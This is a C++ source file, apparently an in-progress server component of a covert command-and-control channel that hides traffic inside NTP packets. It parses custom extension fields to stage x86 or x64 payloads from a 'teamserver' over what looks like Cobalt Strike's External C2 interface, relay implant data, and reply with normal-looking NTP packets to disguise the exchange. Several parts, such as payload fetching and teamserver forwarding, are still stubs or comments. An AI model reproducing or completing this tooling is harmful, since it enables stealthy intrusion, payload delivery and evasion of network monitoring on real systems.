#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include "parsentp.hpp"
#include "helpers.hpp"
#include "createntp.hpp"
#include "constants.hpp"
#include <array>
#include "client.hpp"
#include "constants.hpp"
#include "globals.hpp"

void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
    //bug is here, as it was +48 instead of whtaever. Need to get size safely, as well.
    //safely moving into vector by doing data + len (data is a char* so it's the first item
    std::vector<uint8_t> packet(data, data + len);

    std::cout << "Received " << len << " bytes from "
        << inet_ntoa(client_addr->sin_addr) << ":"
        << ntohs(client_addr->sin_port) << std::endl;

    //std::cout << "Theoretical Client ID" << generateClientID() << std::endl;

    //1. Run some checks to make sure an extension field exists, and extract it if so

    //2 seperate for different error messages. Could just be the < 52 one as well.
    if (packet.size() <= 48) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet " << std::endl;
        std::cout << "----------------------" << std::endl;        //send back a default packet
        sendNormalNtpPacket(client_addr, sock);
        return;
    }

    //each packet needs the 4 byte header, so check if there are bytes there
    if (packet.size() < 52) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet " << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "Packet does not contain an extension field" << std::endl;

        //send back a default packet
        sendNormalNtpPacket(client_addr, sock);

        return;
    }

    //after validateion for stuff

    //Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
    std::vector<uint8_t> sessionId;
    sessionId.insert(sessionId.begin(), packet.begin() + 4, packet.begin() + 8); //copies between byte 4 and 8, 
    printHexVector(sessionId); //sanity debug check


    //Extract extension field
    NTPPacketParser ntpPacket(packet);
    std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
    std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();
    //standard here: print debug header of packet type, then printthe packet

    //2. Do different actions based on what type of packet/extension field is coming in
    if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Give Me Payload " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //extract arch
        uint8_t payloadArch = 0x00; // declared outside so its in scope

        try {
            payloadArch = ntpPacketExtension.at(8); // throws if index >= size, safer than []
        }
        catch (const std::out_of_range& e) {
            std::cerr << "Packet too short: " << e.what() << std::endl;
            return;
        }

        //static cast so it shows up as hex, and not å (whcih is ascii 134 lol)
        std::cout << "[?] Payload Arch = 0x" << std::hex << static_cast<int>(payloadArch) << std::endl;  // prints 86

        if (payloadArch == 0x86) {
            std::cout << "[?] X86 Payload Requested " << std::endl;

            /*
            send_frame(socket_extc2, "arch=x86", 8);
	        send_frame(socket_extc2, "pipename=foobar", 15);
	        send_frame(socket_extc2, "block=100", 9);
            
            //get frames back, laod into client class
            */
        }

        else if (payloadArch == 0x64) {
            std::cout << "[?] X64 Payload Requested " << std::endl;

            /*
            * const these plz
            send_frame(socket_extc2, "arch=x64", 8);
            send_frame(socket_extc2, "pipename=foobar", 15);
            send_frame(socket_extc2, "block=100", 9);

            //get frames back, load into client class
            */
        }

        else if (payloadArch == 0x00) {
            std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
            
            //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.
        }

        else {
            std::cout << "[?] Invalid Payload" << std::endl;
        }

        //payloadArch.insert()

        //Parse incoming packet for payload arch
        /*
        0x86/0x64: forward to TS, get payload

        0x00: Incoming for more of payload. 
        
        */

        /*
        if packet.extensiondata == 0x86 {
            //get payload from ts
        }

        else if packet.extesniondata == 0x64 {
            //get payload from ts
        }


        else if packet.extensiondata == 0x00 {
            //check if class exsists for client,
            if so, access next chunk for cleint
            client.getNextChunk()

            //create response packet
            responsePacket = creatResponsePacket

            //and send it
            sendNtpPacket(responsePacket)
        }

        
        */
        


        //Then, once you have payload, send back size of payload.
        


        //temp send back normal packet
        sendNormalNtpPacket(client_addr, sock);

    }

    if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: sizePacket " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        std::cout << "[?] sizePacket recieved, starting chunking" << std::endl;

        uint32_t clientID = generateClientID();
        std::cout << "Theoretical Client ID: " << clientID << std::endl;

        //placeholder for ID
        std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);
        //std::vector<uint8_t> clientIdVector = { 0x00,0x00,0x00,0x00 };

        //create NTP packet for response, with client ID included
        NTPPacket idPacket;

        idPacket.addExtensionField(
            NtpExtensionField::idPacket,
            clientIdVector
        );

        std::vector<uint8_t> rawPacket = idPacket.getPacket();

        sendNtpPacket(
            client_addr,
            sock,
            rawPacket
        );

        //pass to chunker func
        //pass socket, recv from, size, etc.

        //temp send back normal packet
        //sendNormalNtpPacket(client_addr, sock);

    }

    /*
    dataForTeamserver

    ...


    */
    else if (ntpPacketExtensionField == NtpExtensionField::dataForTeamserver) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: dataForTeamserver " << std::endl;
        std::cout << "----------------------" << std::endl;
        //this is data meant for teamserver. Need to fogure out chunkinghere too

        //identify session here too?
        std::cout << "sendDataToTeamserver " << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //send to teamserver

        //get data back

        //send data back with header of NtpExtensionField::dataFromTeamserver

        //temp send back normal packet
        sendNormalNtpPacket(client_addr, sock);
    }

    else {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Unknown " << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "[?] Packet extension did not match any known extensions" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //if none of the headers match,s end back regular NTP packet
        //send back normal packet
        sendNormalNtpPacket(client_addr, sock);

    }

}
